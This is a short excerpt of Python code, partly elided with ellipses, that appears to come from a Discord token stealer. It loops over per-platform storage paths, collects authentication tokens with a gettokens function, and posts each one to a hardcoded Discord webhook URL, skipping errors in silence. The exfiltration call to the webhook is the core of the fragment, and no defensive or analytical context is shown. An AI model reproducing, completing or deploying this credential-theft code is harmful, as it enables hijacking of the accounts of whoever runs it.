    ...
    for platform, path in PATHS.items():
        ...
        for token in gettokens(path):
            ...
            try:
                ...
                requests.post('https://discord.com/api/webhooks/1343315527161876510/C-lXrEFbRk0_wFVbzIKnUtza8SRIflZ54XVq9IzNPUXy43otxnwWh3I-bs9RnX08UeLZ', json=embed_user, headers=getheaders())
            except:
                continue
